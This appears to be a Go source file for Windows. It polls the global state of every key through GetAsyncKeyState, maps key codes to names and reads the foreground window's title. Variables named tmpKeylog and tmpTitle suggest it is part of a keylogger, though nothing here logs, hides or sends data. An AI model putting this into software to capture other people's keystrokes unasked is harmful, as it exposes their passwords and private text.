package main

import (
	"fmt"
	"syscall"
	"unsafe"

	"github.com/TheTitanrain/w32"
)

var (
	user32                  = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState    = user32.NewProc("GetAsyncKeyState")
	procGetForegroundWindow = user32.NewProc("GetForegroundWindow") //GetForegroundWindow
	procGetWindowTextW      = user32.NewProc("GetWindowTextW")      //GetWindowTextW

	tmpKeylog string
	tmpTitle  string
)

func getForegroundWindow() (hwnd syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)
	if e1 != 0 {
		err = error(e1)
		return
	}
	hwnd = syscall.Handle(r0)
	return
}

func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32, err error) {
	r0, _, e1 := syscall.Syscall(procGetWindowTextW.Addr(), 3, uintptr(hwnd), uintptr(unsafe.Pointer(str)), uintptr(maxCount))
	len = int32(r0)
	if len == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func GetActiveWindowTitle() string {
	g, _ := getForegroundWindow()
	b := make([]uint16, 200)
	_, err := getWindowText(g, &b[0], int32(len(b)))
	if err != nil {
		fmt.Println("getactivewindowtitle-error:", err)
		return "error"
	}
	return syscall.UTF16ToString(b)
}

type KeyCode int

const (
	CTRL              KeyCode = iota
	BACK              KeyCode = iota
	TAB               KeyCode = iota
	ENTER             KeyCode = iota
	SHIFT             KeyCode = iota
	ALT               KeyCode = iota
	CAPSLOCK          KeyCode = iota
	ESC               KeyCode = iota
	SPACE             KeyCode = iota
	PAGEUP            KeyCode = iota
	PAGEDOWN          KeyCode = iota
	END               KeyCode = iota
	LEFT              KeyCode = iota
	UP                KeyCode = iota
	RIGHT             KeyCode = iota
	DOWN              KeyCode = iota
	SELECT            KeyCode = iota
	PRINT             KeyCode = iota
	EXECUTE           KeyCode = iota
	PRINTSCREEN       KeyCode = iota
	INSERT            KeyCode = iota
	DELETE            KeyCode = iota
	HELP              KeyCode = iota
	LEFTWINDOWS       KeyCode = iota
	RIGHTWINDOWS      KeyCode = iota
	APPLICATIONSELECT KeyCode = iota
	SLEEP             KeyCode = iota
	PAD0              KeyCode = iota
	PAD1              KeyCode = iota
	PAD2              KeyCode = iota
	PAD3              KeyCode = iota
	PAD4              KeyCode = iota
	PAD5              KeyCode = iota
	PAD6              KeyCode = iota
	PAD7              KeyCode = iota
	PAD8              KeyCode = iota
	PAD9              KeyCode = iota
	MULTIPLY          KeyCode = iota
	ADD               KeyCode = iota
	SEPARATOR         KeyCode = iota
	SUBTRACT          KeyCode = iota
	DECIMAL           KeyCode = iota
	DIVIDE            KeyCode = iota
	F1                KeyCode = iota
	F2                KeyCode = iota
	F3                KeyCode = iota
	F4                KeyCode = iota
	F5                KeyCode = iota
	F6                KeyCode = iota
	F7                KeyCode = iota
	F8                KeyCode = iota
	F9                KeyCode = iota
	F10               KeyCode = iota
	F11               KeyCode = iota
	F12               KeyCode = iota
	NUMLOCK           KeyCode = iota
	SCROLLLOCK        KeyCode = iota
	LSHIFT            KeyCode = iota
	RSHIFT            KeyCode = iota
	LCTRL             KeyCode = iota
	RCTRL             KeyCode = iota
	LeftMENU          KeyCode = iota
	RightMENU         KeyCode = iota
	SEMICOLON         KeyCode = iota
	SLASH             KeyCode = iota
	BACKTICK          KeyCode = iota
	LEFTBRACKET       KeyCode = iota
	BACKSLASH         KeyCode = iota
	RIGHTBRACKET      KeyCode = iota
	SINGLEQUOTE       KeyCode = iota
	PERIOD            KeyCode = iota
	ZERO              KeyCode = iota
	ONE               KeyCode = iota
	TWO               KeyCode = iota
	THREE             KeyCode = iota
	FOUR              KeyCode = iota
	FIVE              KeyCode = iota
	SIX               KeyCode = iota
	SEVEN             KeyCode = iota
	EIGHT             KeyCode = iota
	NINE              KeyCode = iota
	A                 KeyCode = iota
	B                 KeyCode = iota
	C                 KeyCode = iota
	D                 KeyCode = iota
	E                 KeyCode = iota
	F                 KeyCode = iota
	G                 KeyCode = iota
	H                 KeyCode = iota
	I                 KeyCode = iota
	J                 KeyCode = iota
	K                 KeyCode = iota
	L                 KeyCode = iota
	M                 KeyCode = iota
	N                 KeyCode = iota
	O                 KeyCode = iota
	P                 KeyCode = iota
	Q                 KeyCode = iota
	R                 KeyCode = iota
	S                 KeyCode = iota
	T                 KeyCode = iota
	U                 KeyCode = iota
	V                 KeyCode = iota
	W                 KeyCode = iota
	X                 KeyCode = iota
	Y                 KeyCode = iota
	Z                 KeyCode = iota
	LBUTTON           KeyCode = iota
	RBUTTON           KeyCode = iota
	MBUTTON           KeyCode = iota
	ARROWUP           KeyCode = iota
	ARROWDOWN         KeyCode = iota
	ARROWLEFT         KeyCode = iota
	ARROWRIGHT        KeyCode = iota
  COMMA             KeyCode = iota
	UNKNOWN           KeyCode = iota
)

func toKeycode(key int) KeyCode {
	switch key {
	case w32.VK_RSHIFT:
		return RSHIFT
	case w32.VK_LCONTROL:
		return LCTRL
	case w32.VK_RCONTROL:
		return RCTRL
	case w32.VK_LMENU:
		return LeftMENU
	case w32.VK_RMENU:
		return RightMENU
	case w32.VK_OEM_1:
		return SEMICOLON
	case w32.VK_OEM_2:
		return SLASH
	case w32.VK_OEM_3:
		return BACKTICK
	case w32.VK_OEM_4:
		return LEFTBRACKET
	case w32.VK_OEM_5:
		return BACKSLASH
	case w32.VK_OEM_6:
		return RIGHTBRACKET
	case w32.VK_OEM_7:
		return SINGLEQUOTE
	case w32.VK_OEM_PERIOD:
		return PERIOD
	case 0x30:
		return ZERO
	case 0x31:
		return ONE
	case 0x32:
		return TWO
	case 0x33:
		return THREE
	case 0x34:
		return FOUR
	case 0x35:
		return FIVE
	case 0x36:
		return SIX
	case 0x37:
		return SEVEN
	case 0x38:
		return EIGHT
	case 0x39:
		return NINE
	case 0x41:
		return A
	case 0x42:
		return B
	case 0x43:
		return C
	case 0x44:
		return D
	case 0x45:
		return E
	case 0x46:
		return F
	case 0x47:
		return G
	case 0x48:
		return H
	case 0x49:
		return I
	case 0x4A:
		return J
	case 0x4B:
		return K
	case 0x4C:
		return L
	case 0x4D:
		return M
	case 0x4E:
		return N
	case 0x4F:
		return O
	case 0x50:
		return P
	case 0x51:
		return Q
	case 0x52:
		return R
	case 0x53:
		return S
	case 0x54:
		return T
	case 0x55:
		return U
	case 0x56:
		return V
	case 0x57:
		return W
	case 0x58:
		return X
	case 0x59:
		return Y
	case 0x5A:
		return Z
	case 0x01:
		return LBUTTON
	case 0x02:
		return RBUTTON
	case 0x04:
		return MBUTTON
	case 9:
		return TAB
  case 13:
    return ENTER
	case 16:
		return SHIFT
	case 17:
		return CTRL
	case 18:
		return ALT
	case 27:
		return ESC
	case 38:
		return ARROWUP
	case 37:
		return ARROWLEFT
	case 39:
		return ARROWRIGHT
	case 40:
		return ARROWDOWN
	case 160:
		return LSHIFT
  case 188:
    return COMMA
	}

	fmt.Println("unknown key:", fmt.Sprintf("%d", key))
	return UNKNOWN
}

func GetPressedKeys() []KeyCode {
	var keys []KeyCode
	for KEY := 0; KEY <= 256; KEY++ {
		Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
		if Val == 0 {
			continue
		}
		key := toKeycode(KEY)
		if key == UNKNOWN {
			continue
		}
		if key == LeftMENU {
			continue
		}
		if Val == 32769 {
			keys = append(keys, key)
		} else if Val == 32768 {
			keys = append(keys, key)
		} else if Val == 1 {
			keys = append(keys, key)
		} else if Val != 0 {
			fmt.Println("unknown value:", Val, " key:", toKeycode(KEY))
		}
	}
	return keys
}
